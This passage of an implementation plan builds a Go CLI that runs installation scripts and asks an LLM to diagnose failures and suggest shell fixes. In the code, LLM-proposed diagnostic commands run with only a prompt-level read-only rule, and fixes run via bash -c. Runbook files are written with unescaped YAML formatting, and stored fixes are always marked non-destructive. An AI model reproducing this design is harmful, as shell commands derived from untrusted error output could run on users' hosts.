		return fmt.Errorf("no local runbook directory configured")
	}

	agentRunbook := filepath.Join(m.localDir, agentName)
	os.MkdirAll(agentRunbook, 0755)

	// Generate ID
	entry.ID = fmt.Sprintf("%03d", len(m.local.Entries)+1)
	entry.FirstSeen = time.Now().UTC().Format(time.RFC3339)
	entry.LastSeen = entry.FirstSeen
	entry.ResolvedCount = 1

	// Write entry file
	slug := slugify(entry.RootCause)
	filename := fmt.Sprintf("%s-%s.md", entry.ID, slug)
	entryPath := filepath.Join(agentRunbook, filename)

	content := fmt.Sprintf(`---
id: "%s"
error_pattern: "%s"
step_failed: "%s"
root_cause: "%s"
fix_command: "%s"
resolved_count: %d
first_seen: "%s"
last_seen: "%s"
---

## Resolution
`+"`%s`\n", entry.ID, entry.ErrorPattern, entry.StepFailed, entry.RootCause, entry.FixCommand, entry.ResolvedCount, entry.FirstSeen, entry.LastSeen, entry.FixCommand)

	if err := os.WriteFile(entryPath, []byte(content), 0644); err != nil {
		return err
	}

	// Update index
	m.local.Entries = append(m.local.Entries, schemas.RunbookIndexEntry{
		Pattern:   entry.ErrorPattern,
		EntryFile: filename,
	})

	return m.saveLocalIndex(agentRunbook)
}

// IncrementCount updates the resolved_count and last_seen for an existing entry.
func (m *Manager) IncrementCount(entry *schemas.RunbookEntry) {
	entry.ResolvedCount++
	entry.LastSeen = time.Now().UTC().Format(time.RFC3339)
}

func (m *Manager) matchIndex(index schemas.RunbookIndex, dir string, lowerError string) (schemas.RunbookEntry, bool) {
	for _, ie := range index.Entries {
		pattern := strings.ToLower(ie.Pattern)
		if strings.Contains(lowerError, pattern) {
			entry, err := loadEntry(filepath.Join(dir, ie.EntryFile))
			if err == nil {
				return entry, true
			}
		}
	}
	return schemas.RunbookEntry{}, false
}

func (m *Manager) saveLocalIndex(dir string) error {
	data, err := yaml.Marshal(m.local)
	if err != nil {
		return err
	}
	return os.WriteFile(filepath.Join(dir, "index.yaml"), data, 0644)
}

func loadIndex(path string) schemas.RunbookIndex {
	data, err := os.ReadFile(path)
	if err != nil {
		return schemas.RunbookIndex{}
	}
	var index schemas.RunbookIndex
	yaml.Unmarshal(data, &index)
	return index
}

func loadEntry(path string) (schemas.RunbookEntry, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return schemas.RunbookEntry{}, err
	}

	// Parse YAML frontmatter between --- markers
	content := string(data)
	parts := strings.SplitN(content, "---", 3)
	if len(parts) < 3 {
		return schemas.RunbookEntry{}, fmt.Errorf("invalid frontmatter in %s", path)
	}

	var entry schemas.RunbookEntry
	if err := yaml.Unmarshal([]byte(parts[1]), &entry); err != nil {
		return schemas.RunbookEntry{}, err
	}
	return entry, nil
}

func slugify(s string) string {
	s = strings.ToLower(s)
	s = strings.Map(func(r rune) rune {
		if r >= 'a' && r <= 'z' || r >= '0' && r <= '9' {
			return r
		}
		return '-'
	}, s)
	// Collapse multiple dashes
	for strings.Contains(s, "--") {
		s = strings.ReplaceAll(s, "--", "-")
	}
	s = strings.Trim(s, "-")
	if len(s) > 40 {
		s = s[:40]
	}
	return s
}
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go test ./internal/runbook/ -v
```

Expected: All tests PASS.

- [ ] **Step 5: Commit**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
git add internal/runbook/
git commit -m "feat: add runbook manager with pattern matching and entry writing"
```

---

### Task 10: LLM Agent (Nerd Completion Client)

**Files:**
- Create: `ai-driven-installation/internal/agent/agent.go`

- [ ] **Step 1: Write the LLM agent**

```go
// internal/agent/agent.go
package agent

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"

	"github.com/newrelic/nr-diagnose/internal/config"
	sysContext "github.com/newrelic/nr-diagnose/internal/context"
	"github.com/newrelic/nr-diagnose/internal/registry"
	"github.com/newrelic/nr-diagnose/internal/schemas"
	"github.com/newrelic/nr-diagnose/internal/scrub"
)

const systemPromptDetective = `You are the Intelligent Inference Engine of a DevOps installation CLI wrapper.
An installation script step has just failed. You receive the failed command, its
stderr/stdout, exit code, and host OS context.

Your job: select the exact, localized terminal diagnostic commands needed to
isolate the root cause.

CRITICAL SAFETY: You may ONLY emit read-only diagnostic commands (e.g., ping,
nc, netstat, ss, ufw status, iptables -L, curl, systemctl status, lsof).
Do NOT emit destructive or modifying commands.

You MUST respond with ONLY a valid JSON object in this exact format:
{"hypothesis": "your hypothesis", "diagnostic_commands": ["cmd1", "cmd2"]}
`

const systemPromptResolver = `You are the Remediation Engine. You receive:
1. The original failed command and its error output
2. The raw terminal output from the diagnostic commands you previously requested

Analyze the diagnostic output, isolate the definitive root cause, and provide:
- A precise root cause statement
- A plain-English explanation for the developer
- A single, concrete terminal command to fix the issue
- Whether that command is destructive

Keep explanations punchy, empathetic, and developer-centric.

You MUST respond with ONLY a valid JSON object in this exact format:
{"root_cause": "...", "human_explanation": "...", "remediation_command": "...", "is_destructive": false}
`

// chatMessage represents a message in the OpenAI chat format.
type chatMessage struct {
	Role    string `json:"role"`
	Content string `json:"content"`
}

// chatRequest represents an OpenAI-compatible chat completion request.
type chatRequest struct {
	Model    string        `json:"model"`
	Messages []chatMessage `json:"messages"`
}

// chatResponse represents the response from the chat API.
type chatResponse struct {
	Choices []struct {
		Message struct {
			Content string `json:"content"`
		} `json:"message"`
	} `json:"choices"`
}

// Agent handles LLM communication for diagnostics and remediation.
type Agent struct {
	cfg    *config.Config
	client *http.Client
}

// New creates a new LLM agent.
func New(cfg *config.Config) *Agent {
	return &Agent{
		cfg:    cfg,
		client: &http.Client{},
	}
}

// Diagnose performs Turn 1: sends failure context to LLM, gets diagnostic commands back.
func (a *Agent) Diagnose(step schemas.StepResult, osCtx *sysContext.OSContext, agentInfo *registry.Agent) (*schemas.DiagnosticPayload, error) {
	userPrompt := buildDiagnosticPrompt(step, osCtx, agentInfo)
	userPrompt = scrub.Scrub(userPrompt)

	response, err := a.chat(systemPromptDetective, userPrompt)
	if err != nil {
		return nil, fmt.Errorf("LLM call failed: %w", err)
	}

	var payload schemas.DiagnosticPayload
	if err := json.Unmarshal([]byte(extractJSON(response)), &payload); err != nil {
		return nil, fmt.Errorf("failed to parse LLM response: %w\nRaw: %s", err, response)
	}
	return &payload, nil
}

// Remediate performs Turn 2: sends diagnostic results to LLM, gets fix back.
func (a *Agent) Remediate(step schemas.StepResult, diagnosticResults map[string]string, agentInfo *registry.Agent) (*schemas.RemediationPayload, error) {
	userPrompt := buildRemediationPrompt(step, diagnosticResults, agentInfo)
	userPrompt = scrub.Scrub(userPrompt)

	response, err := a.chat(systemPromptResolver, userPrompt)
	if err != nil {
		return nil, fmt.Errorf("LLM call failed: %w", err)
	}

	var payload schemas.RemediationPayload
	if err := json.Unmarshal([]byte(extractJSON(response)), &payload); err != nil {
		return nil, fmt.Errorf("failed to parse LLM response: %w\nRaw: %s", err, response)
	}
	return &payload, nil
}

func (a *Agent) chat(systemPrompt, userPrompt string) (string, error) {
	req := chatRequest{
		Model: a.cfg.Model,
		Messages: []chatMessage{
			{Role: "system", Content: systemPrompt},
			{Role: "user", Content: userPrompt},
		},
	}

	body, err := json.Marshal(req)
	if err != nil {
		return "", err
	}

	url := strings.TrimRight(a.cfg.BaseURL, "/") + "/v1/chat/completions"
	httpReq, err := http.NewRequest("POST", url, bytes.NewReader(body))
	if err != nil {
		return "", err
	}
	httpReq.Header.Set("Content-Type", "application/json")
	httpReq.Header.Set("Authorization", "Bearer "+a.cfg.APIKey)

	resp, err := a.client.Do(httpReq)
	if err != nil {
		return "", fmt.Errorf("HTTP request failed: %w", err)
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	if resp.StatusCode != 200 {
		return "", fmt.Errorf("LLM returned status %d: %s", resp.StatusCode, string(respBody))
	}

	var chatResp chatResponse
	if err := json.Unmarshal(respBody, &chatResp); err != nil {
		return "", fmt.Errorf("failed to parse API response: %w", err)
	}

	if len(chatResp.Choices) == 0 {
		return "", fmt.Errorf("no choices in LLM response")
	}

	return chatResp.Choices[0].Message.Content, nil
}

func buildDiagnosticPrompt(step schemas.StepResult, osCtx *sysContext.OSContext, agentInfo *registry.Agent) string {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("## Failed Command\n```\n%s\n```\n\n", step.Command))
	sb.WriteString(fmt.Sprintf("## Exit Code: %d\n\n", step.ExitCode))
	if step.Stdout != "" {
		sb.WriteString(fmt.Sprintf("## Stdout\n```\n%s\n```\n\n", step.Stdout))
	}
	if step.Stderr != "" {
		sb.WriteString(fmt.Sprintf("## Stderr\n```\n%s\n```\n\n", step.Stderr))
	}
	sb.WriteString(fmt.Sprintf("## OS Context\n%s\n", osCtx.String()))

	if agentInfo != nil {
		if agentInfo.Knowledge.CommonFailures != "" {
			sb.WriteString(fmt.Sprintf("## Known Failure Modes for %s\n%s\n\n", agentInfo.Manifest.DisplayName, agentInfo.Knowledge.CommonFailures))
		}
		if agentInfo.Knowledge.Prerequisites != "" {
			sb.WriteString(fmt.Sprintf("## Prerequisites\n%s\n\n", agentInfo.Knowledge.Prerequisites))
		}
		if len(agentInfo.Hints.PriorityCommands) > 0 {
			sb.WriteString("## Suggested Diagnostic Commands (prioritize these)\n")
			for _, cmd := range agentInfo.Hints.PriorityCommands {
				sb.WriteString(fmt.Sprintf("- %s\n", cmd))
			}
			sb.WriteString("\n")
		}
		if len(agentInfo.Hints.ContextHints) > 0 {
			sb.WriteString("## Domain Context\n")
			for _, hint := range agentInfo.Hints.ContextHints {
				sb.WriteString(fmt.Sprintf("- %s\n", hint))
			}
			sb.WriteString("\n")
		}
	}

	return sb.String()
}

func buildRemediationPrompt(step schemas.StepResult, diagnosticResults map[string]string, agentInfo *registry.Agent) string {
	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("## Original Failed Command\n```\n%s\n```\n\n", step.Command))
	if step.Stderr != "" {
		sb.WriteString(fmt.Sprintf("## Original Error\n```\n%s\n```\n\n", step.Stderr))
	}
	sb.WriteString("## Diagnostic Results\n")
	for cmd, output := range diagnosticResults {
		sb.WriteString(fmt.Sprintf("### `%s`\n```\n%s\n```\n\n", cmd, output))
	}
	return sb.String()
}

// extractJSON tries to find a JSON object in the LLM response (handles markdown fences).
func extractJSON(s string) string {
	s = strings.TrimSpace(s)
	// Strip markdown code fences if present
	if strings.HasPrefix(s, "```json") {
		s = strings.TrimPrefix(s, "```json")
		s = strings.TrimSuffix(s, "```")
		s = strings.TrimSpace(s)
	} else if strings.HasPrefix(s, "```") {
		s = strings.TrimPrefix(s, "```")
		s = strings.TrimSuffix(s, "```")
		s = strings.TrimSpace(s)
	}
	// Find first { and last }
	start := strings.Index(s, "{")
	end := strings.LastIndex(s, "}")
	if start >= 0 && end > start {
		return s[start : end+1]
	}
	return s
}
```

- [ ] **Step 2: Verify it compiles**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go build ./internal/agent/
```

- [ ] **Step 3: Commit**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
git add internal/agent/
git commit -m "feat: add LLM agent with 2-turn diagnostic/remediation flow"
```

---

### Task 11: Terminal UI

**Files:**
- Create: `ai-driven-installation/internal/ui/ui.go`

- [ ] **Step 1: Add lipgloss dependency**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go get github.com/charmbracelet/lipgloss@latest
go get github.com/fatih/color@latest
```

- [ ] **Step 2: Write the UI package**

```go
// internal/ui/ui.go
package ui

import (
	"bufio"
	"fmt"
	"os"
	"strings"

	"github.com/charmbracelet/lipgloss"
	"github.com/newrelic/nr-diagnose/internal/schemas"
)

var (
	successStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("2")) // green
	errorStyle   = lipgloss.NewStyle().Foreground(lipgloss.Color("1")) // red
	warnStyle    = lipgloss.NewStyle().Foreground(lipgloss.Color("3")) // yellow
	infoStyle    = lipgloss.NewStyle().Foreground(lipgloss.Color("4")) // blue
	dimStyle     = lipgloss.NewStyle().Foreground(lipgloss.Color("8")) // gray

	boxStyle = lipgloss.NewStyle().
			Border(lipgloss.RoundedBorder()).
			BorderForeground(lipgloss.Color("4")).
			Padding(0, 1)

	destructiveBoxStyle = lipgloss.NewStyle().
				Border(lipgloss.RoundedBorder()).
				BorderForeground(lipgloss.Color("1")).
				Padding(0, 1)
)

// StepStart prints the start of a step execution.
func StepStart(stepNum, total int, command string) {
	fmt.Printf("%s %s\n",
		dimStyle.Render(fmt.Sprintf("[%d/%d]", stepNum, total)),
		command,
	)
}

// StepSuccess prints a successful step completion.
func StepSuccess(stepNum, total int, command string) {
	fmt.Printf("%s %s %s\n",
		successStyle.Render("✓"),
		dimStyle.Render(fmt.Sprintf("[%d/%d]", stepNum, total)),
		command,
	)
}

// StepFailure prints a failed step.
func StepFailure(stepNum, total int, command string, stderr string) {
	fmt.Printf("%s %s %s\n",
		errorStyle.Render("✗"),
		dimStyle.Render(fmt.Sprintf("[%d/%d]", stepNum, total)),
		errorStyle.Render(command),
	)
	if stderr != "" {
		fmt.Printf("  %s\n", dimStyle.Render(truncate(stderr, 200)))
	}
}

// Diagnosing shows the LLM diagnosis spinner message.
func Diagnosing() {
	fmt.Printf("\n%s AI Agent diagnosing failure...\n", infoStyle.Render("⟳"))
}

// RunningDiagnostics shows that diagnostic commands are being run.
func RunningDiagnostics() {
	fmt.Printf("%s Running diagnostic commands...\n", infoStyle.Render("⟳"))
}

// ShowRemediation displays the remediation result with a prompt.
func ShowRemediation(payload *schemas.RemediationPayload, fromRunbook bool, resolvedCount int) {
	fmt.Println()

	// Root cause box
	title := "Root Cause"
	style := boxStyle
	if fromRunbook {
		title = "Root Cause (from runbook)"
		if resolvedCount > 0 {
			title = fmt.Sprintf("Root Cause (from runbook, resolved %d times)", resolvedCount)
		}
	}

	box := style.Render(fmt.Sprintf("─── %s ───\n%s", title, payload.RootCause))
	fmt.Println(box)
	fmt.Println()

	// Explanation
	fmt.Printf("%s %s\n\n", infoStyle.Render("Explanation:"), payload.HumanExplanation)

	// Fix command
	if payload.IsDestructive {
		dbox := destructiveBoxStyle.Render(fmt.Sprintf("Suggested Fix:\n  %s\n\n⚠  WARNING: This command is destructive!", payload.RemediationCommand))
		fmt.Println(dbox)
	} else {
		fmt.Printf("%s\n  %s\n\n", warnStyle.Render("Suggested Fix:"), payload.RemediationCommand)
	}
}

// PromptAction asks the user Y/n/q and returns the choice.
func PromptAction(isDestructive bool) rune {
	prompt := "Execute this fix? [Y]es / [n]o (skip step) / [q]uit: "
	if isDestructive {
		prompt = warnStyle.Render("Execute this DESTRUCTIVE fix? [Y]es / [n]o (skip step) / [q]uit: ")
	}
	fmt.Print(prompt)

	reader := bufio.NewReader(os.Stdin)
	input, _ := reader.ReadString('\n')
	input = strings.TrimSpace(strings.ToLower(input))

	switch {
	case input == "y" || input == "yes":
		return 'y'
	case input == "q" || input == "quit":
		return 'q'
	default:
		return 'n'
	}
}

// FixApplied shows the result of applying a fix.
func FixApplied(success bool) {
	if success {
		fmt.Printf("%s Fix applied successfully. Re-running step...\n\n", successStyle.Render("✓"))
	} else {
		fmt.Printf("%s Fix did not resolve the issue.\n", errorStyle.Render("✗"))
	}
}

// Summary prints the final execution summary.
func Summary(total, passed, failed, skipped int) {
	fmt.Printf("\n%s\n", strings.Repeat("─", 50))
	fmt.Printf("Steps: %d total, %s passed, %s failed, %s skipped\n",
		total,
		successStyle.Render(fmt.Sprintf("%d", passed)),
		errorStyle.Render(fmt.Sprintf("%d", failed)),
		warnStyle.Render(fmt.Sprintf("%d", skipped)),
	)
}

// ShowHypothesis displays the LLM's initial hypothesis.
func ShowHypothesis(hypothesis string) {
	fmt.Printf("%s %s\n", infoStyle.Render("Hypothesis:"), hypothesis)
}

func truncate(s string, maxLen int) string {
	s = strings.TrimSpace(s)
	if len(s) > maxLen {
		return s[:maxLen] + "..."
	}
	return s
}
```

- [ ] **Step 3: Verify it compiles**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go build ./internal/ui/
```

- [ ] **Step 4: Commit**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
git add internal/ui/
git commit -m "feat: add terminal UI with lipgloss styling and interactive prompts"
```

---

### Task 12: Step Runner + Resume Controller

**Files:**
- Create: `ai-driven-installation/internal/runner/runner.go`

- [ ] **Step 1: Write the runner**

```go
// internal/runner/runner.go
package runner

import (
	"fmt"
	"os/exec"
	"strings"

	"github.com/newrelic/nr-diagnose/internal/agent"
	sysContext "github.com/newrelic/nr-diagnose/internal/context"
	"github.com/newrelic/nr-diagnose/internal/diagnostics"
	"github.com/newrelic/nr-diagnose/internal/registry"
	"github.com/newrelic/nr-diagnose/internal/runbook"
	"github.com/newrelic/nr-diagnose/internal/schemas"
	"github.com/newrelic/nr-diagnose/internal/ui"
)

// Options configures the runner behavior.
type Options struct {
	Verbose bool
	DryRun  bool
}

// Result tracks overall execution stats.
type Result struct {
	Total   int
	Passed  int
	Failed  int
	Skipped int
}

// Run executes all steps with AI-powered failure handling.
func Run(steps []string, agentInfo *registry.Agent, llmAgent *agent.Agent, rbMgr *runbook.Manager, opts Options) *Result {
	result := &Result{Total: len(steps)}

	if opts.DryRun {
		fmt.Println("Dry-run mode: showing parsed steps without executing\n")
		for i, step := range steps {
			fmt.Printf("  [%d/%d] %s\n", i+1, len(steps), step)
		}
		return result
	}

	osCtx := sysContext.Collect()

	for i, step := range steps {
		stepNum := i + 1
		ui.StepStart(stepNum, len(steps), step)

		stepResult := executeStep(stepNum, step)

		if stepResult.Success {
			ui.StepSuccess(stepNum, len(steps), step)
			result.Passed++
			continue
		}

		// Step failed
		ui.StepFailure(stepNum, len(steps), step, stepResult.Stderr)
		errorOutput := stepResult.Stderr
		if errorOutput == "" {
			errorOutput = stepResult.Stdout
		}

		// Check runbook first
		var remediation *schemas.RemediationPayload
		fromRunbook := false
		resolvedCount := 0

		if rbMgr != nil {
			entry, found := rbMgr.Match(errorOutput)
			if found {
				remediation = &schemas.RemediationPayload{
					RootCause:          entry.RootCause,
					HumanExplanation:   fmt.Sprintf("This is a known issue (seen %d times before).", entry.ResolvedCount),
					RemediationCommand: entry.FixCommand,
					IsDestructive:      false,
				}
				fromRunbook = true
				resolvedCount = entry.ResolvedCount
			}
		}

		// If no runbook match, use LLM
		if remediation == nil && llmAgent != nil {
			ui.Diagnosing()

			// Turn 1: Get diagnostic commands
			diagPayload, err := llmAgent.Diagnose(stepResult, osCtx, agentInfo)
			if err != nil {
				fmt.Printf("  LLM error: %v\n", err)
				result.Failed++
				continue
			}

			ui.ShowHypothesis(diagPayload.Hypothesis)
			ui.RunningDiagnostics()

			// Execute diagnostics
			diagResults := diagnostics.RunAll(diagPayload.DiagnosticCommands)

			// Turn 2: Get remediation
			remPayload, err := llmAgent.Remediate(stepResult, diagResults, agentInfo)
			if err != nil {
				fmt.Printf("  LLM error: %v\n", err)
				result.Failed++
				continue
			}
			remediation = remPayload
		}

		if remediation == nil {
			result.Failed++
			continue
		}

		// Show remediation and prompt
		ui.ShowRemediation(remediation, fromRunbook, resolvedCount)
		choice := ui.PromptAction(remediation.IsDestructive)

		switch choice {
		case 'y':
			// Execute the fix
			fixOut, fixErr := exec.Command("bash", "-c", remediation.RemediationCommand).CombinedOutput()
			if opts.Verbose && len(fixOut) > 0 {
				fmt.Printf("  Fix output: %s\n", string(fixOut))
			}
			_ = fixErr

			// Re-run the failed step
			retryResult := executeStep(stepNum, step)
			if retryResult.Success {
				ui.FixApplied(true)
				ui.StepSuccess(stepNum, len(steps), step)
				result.Passed++

				// Save to runbook if this was an LLM-driven fix
				if !fromRunbook && rbMgr != nil {
					agentName := "unknown"
					if agentInfo != nil {
						agentName = agentInfo.Manifest.Name
					}
					rbMgr.WriteEntry(agentName, schemas.RunbookEntry{
						ErrorPattern: extractPattern(errorOutput),
						StepFailed:   fmt.Sprintf("Step %d: %s", stepNum, step),
						RootCause:    remediation.RootCause,
						FixCommand:   remediation.RemediationCommand,
					})
				}
			} else {
				ui.FixApplied(false)
				result.Failed++
			}

		case 'n':
			result.Skipped++

		case 'q':
			result.Failed++
			ui.Summary(result.Total, result.Passed, result.Failed, result.Skipped)
			return result
		}
	}

	ui.Summary(result.Total, result.Passed, result.Failed, result.Skipped)
	return result
}

func executeStep(stepNum int, command string) schemas.StepResult {
	cmd := exec.Command("bash", "-c", command)
	var stdout, stderr strings.Builder
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()
	exitCode := 0
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		} else {
			exitCode = 1
		}
	}

	return schemas.StepResult{
		StepNumber: stepNum,
		Command:    command,
		ExitCode:   exitCode,
		Stdout:     stdout.String(),
		Stderr:     stderr.String(),
		Success:    exitCode == 0,
	}
}

// extractPattern gets a short, matchable pattern from the error output.
func extractPattern(errorOutput string) string {
	// Take first non-empty line, trimmed to 80 chars
	lines := strings.Split(errorOutput, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line != "" {
			if len(line) > 80 {
				return line[:80]
			}
			return line
		}
	}
	return errorOutput[:min(80, len(errorOutput))]
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
```

- [ ] **Step 2: Verify it compiles**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
go build ./internal/runner/
```

- [ ] **Step 3: Commit**

```bash
cd /Users/tbalanagu/Documents/newrelic/hackathon/ai-driven-installation
git add internal/runner/
git commit -m "feat: add step runner with runbook check, LLM fallback, and resume"
```

---

### Task 13: CLI Commands (run, list, new-agent, sync)

**Files:**
- Create: `ai-driven-installation/cmd/run.go`
- Create: `ai-driven-installation/cmd/list.go`
- Create: `ai-driven-installation/cmd/new_agent.go`
- Create: `ai-driven-installation/cmd/sync.go`

- [ ] **Step 1: Write the run command**

```go
// cmd/run.go
package cmd

import (
	"fmt"
	"os"
	"path/filepath"

	"github.com/newrelic/nr-diagnose/internal/agent"
	"github.com/newrelic/nr-diagnose/internal/config"
	"github.com/newrelic/nr-diagnose/internal/parser"
	"github.com/newrelic/nr-diagnose/internal/registry"
	"github.com/newrelic/nr-diagnose/internal/runbook"
	"github.com/newrelic/nr-diagnose/internal/runner"
	"github.com/spf13/cobra"
)

var (
	agentName string
	verbose   bool
	dryRun    bool
	model     string
)

var runCmd = &cobra.Command{
	Use:   "run [script-path]",
	Short: "Run an installation script with AI-powered diagnostics",
	Long:  "Execute an agent install script step-by-step. On failure, the AI agent diagnoses the issue and suggests a fix.",
	Args:  cobra.MaximumNArgs(1),
	RunE:  runExecute,
}

func init() {
	runCmd.Flags().StringVar(&agentName, "agent", "", "Agent name (e.g., otel-oracledb)")
	runCmd.Flags().BoolVar(&verbose, "verbose", false, "Show all step output")
	runCmd.Flags().BoolVar(&dryRun, "dry-run", false, "Parse and show steps without executing")
	runCmd.Flags().StringVar(&model, "model", "", "LLM model to use (overrides config)")
}

func runExecute(cmd *cobra.Command, args []string) error {
	cfg, err := config.Load()
	if err != nil {
		return fmt.Errorf("loading config: %w", err)
	}
	if model != "" {
		cfg.Model = model
	}
	cfg.Verbose = verbose

	// Determine agents directory
	agentsDir := cfg.AgentsDir
	if agentsDir == "" {
		// Default: look for agents/ relative to binary or cwd
		exe, _ := os.Executable()
		agentsDir = filepath.Join(filepath.Dir(exe), "agents")
		if _, err := os.Stat(agentsDir); err != nil {
			agentsDir = filepath.Join(".", "agents")
		}
	}

	var agentInfo *registry.Agent
	var scriptContent string

	if agentName != "" {
		// Load agent from registry
		agentDir, err := registry.FindAgentDir(agentsDir, agentName)
		if err != nil {
			return err
		}
		agentInfo, err = registry.LoadAgent(agentDir)
		if err != nil {
			return fmt.Errorf("loading agent %q: %w", agentName, err)
		}
		scriptContent = agentInfo.InstallScript
		fmt.Printf("Agent: %s\n", agentInfo.Manifest.DisplayName)
		fmt.Printf("Description: %s\n\n", agentInfo.Manifest.Description)
	} else if len(args) > 0 {
		// Load script from file path
		data, err := os.ReadFile(args[0])
		if err != nil {
			return fmt.Errorf("reading script: %w", err)
		}
		scriptContent = string(data)
	} else {
		return fmt.Errorf("provide --agent <name> or a script path")
	}

	// Parse script into steps
	steps := parser.ParseScript(scriptContent)
	if len(steps) == 0 {
		return fmt.Errorf("no executable steps found in script")
	}

	fmt.Printf("Parsed %d steps\n\n", len(steps))

	// Set up runbook manager
	var rbMgr *runbook.Manager
	seededRunbookDir := ""
	localRunbookDir := filepath.Join(cfg.LocalData, "runbook")
	if agentInfo != nil {
		seededRunbookDir = filepath.Join(agentInfo.Dir, "runbook")
		localRunbookDir = filepath.Join(cfg.LocalData, "runbook", agentInfo.Manifest.Name)
	}
	os.MkdirAll(localRunbookDir, 0755)
	rbMgr, _ = runbook.NewManager(seededRunbookDir, localRunbookDir)

	// Set up LLM agent
	var llmAgent *agent.Agent
	if !dryRun {
		llmAgent = agent.New(cfg)
	}

	// Run
	result := runner.Run(steps, agentInfo, llmAgent, rbMgr, runner.Options{
		Verbose: verbose,
		DryRun:  dryRun,
	})

	if result.Failed > 0 {
		os.Exit(1)
	}
	return nil
}
```

- [ ] **Step 2: Write the list command**

```go
// cmd/list.go
package cmd

import (
	"fmt"
	"os"
	"path/filepath"

	"github.com/newrelic/nr-diagnose/internal/config"
	"github.com/newrelic/nr-diagnose/internal/registry"
	"github.com/spf13/cobra"
)

var listCmd = &cobra.Command{
	Use:   "list",
	Short: "List available agents",
	RunE: func(cmd *cobra.Command, args []string) error {
		cfg, _ := config.Load()
		agentsDir := cfg.AgentsDir
		if agentsDir == "" {
			exe, _ := os.Executable()
			agentsDir = filepath.Join(filepath.Dir(exe), "agents")
			if _, err := os.Stat(agentsDir); err != nil {
				agentsDir = filepath.Join(".", "agents")
			}
		}

		agents, err := registry.ListAgents(agentsDir)
		if err != nil {
			return fmt.Errorf("listing agents: %w", err)
		}

		if len(agents) == 0 {
			fmt.Println("No agents found. Use 'nr-diagnose new-agent <name>' to create one.")
			return nil
		}

		fmt.Printf("Available agents (%d):\n\n", len(agents))
		for _, a := range agents {
			fmt.Printf("  %-20s %s\n", a.Name, a.Description)
		}
		return nil
	},
}
```

- [ ] **Step 3: Write the new-agent command**

```go
// cmd/new_agent.go
package cmd

import (
	"fmt"
	"os"
	"path/filepath"

	"github.com/newrelic/nr-diagnose/internal/config"
	"github.com/spf13/cobra"
)

var newAgentCmd = &cobra.Command{
	Use:   "new-agent <name>",
	Short: "Scaffold a new agent from template",
	Args:  cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		name := args[0]
		cfg, _ := config.Load()
		agentsDir := cfg.AgentsDir
		if agentsDir == "" {
			agentsDir = filepath.Join(".", "agents")
		}

		agentDir := filepath.Join(agentsDir, name)
		if _, err := os.Stat(agentDir); err == nil {
			return fmt.Errorf("agent %q already exists at %s", name, agentDir)
		}

		// Create directory structure
		dirs := []string{
			agentDir,
			filepath.Join(agentDir, "knowledge"),
			filepath.Join(agentDir, "diagnostics"),
			filepath.Join(agentDir, "runbook"),
		}
		for _, d := range dirs {
			os.MkdirAll(d, 0755)
		}

		// Write template files
		manifest := fmt.Sprintf(`name: %s
display_name: "%s"
description: "TODO: Add description"
target_os: linux
ports: []
services: []
prerequisites: []
`, name, name)

		installSh := `#!/bin/bash
# TODO: Add installation steps
echo "Installation script for ` + name + `"
`

		prereqs := "# Prerequisites\n\nTODO: List what must be true before running install.\n"
		failures := "# Common Failures\n\nTODO: Document known failure modes and their fixes.\n"
		refs := "# References\n\nTODO: Add links to official docs and troubleshooting guides.\n"
		hints := "priority_commands: []\ncontext_hints: []\n"
		index := "entries: []\n"

		files := map[string]string{
			filepath.Join(agentDir, "manifest.yaml"):                  manifest,
			filepath.Join(agentDir, "install.sh"):                     installSh,
			filepath.Join(agentDir, "knowledge", "prerequisites.md"):  prereqs,
			filepath.Join(agentDir, "knowledge", "common-failures.md"): failures,
			filepath.Join(agentDir, "knowledge", "references.md"):     refs,
			filepath.Join(agentDir, "diagnostics", "hints.yaml"):      hints,
			filepath.Join(agentDir, "runbook", "index.yaml"):          index,
		}

		for path, content := range files {
			if err := os.WriteFile(path, []byte(content), 0644); err != nil {
				return fmt.Errorf("writing %s: %w", path, err)
			}
		}

		fmt.Printf("Created agent %q at %s\n", name, agentDir)
		fmt.Println("Next steps:")
		fmt.Println("  1. Edit manifest.yaml with agent metadata")
		fmt.Println("  2. Write install.sh with installation steps")
		fmt.Println("  3. Fill in knowledge/ files with domain context")
		return nil
	},
}
```

- [ ] **Step 4: Write the sync command**

```go
// cmd/sync.go
package cmd

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/newrelic/nr-diagnose/internal/config"
	"github.com/spf13/cobra"
)

var syncCmd = &cobra.Command{
	Use:   "sync",
	Short: "Sync local runbook entries to the shared repository",
	RunE: func(cmd *cobra.Command, args []string) error {
		cfg, _ := config.Load()

		localRunbookBase := filepath.Join(cfg.LocalData, "runbook")
		if _, err := os.Stat(localRunbookBase); err != nil {
			fmt.Println("No local runbook entries to sync.")
			return nil
		}

		agentsDir := cfg.AgentsDir
		if agentsDir == "" {
			agentsDir = filepath.Join(".", "agents")
		}

		entries, err := os.ReadDir(localRunbookBase)
		if err != nil {
			return err
		}

		totalCopied := 0
		for _, entry := range entries {
			if !entry.IsDir() {
				continue
			}
			agentName := entry.Name()
			localDir := filepath.Join(localRunbookBase, agentName)
			repoDir := filepath.Join(agentsDir, agentName, "runbook")

			if _, err := os.Stat(repoDir); err != nil {
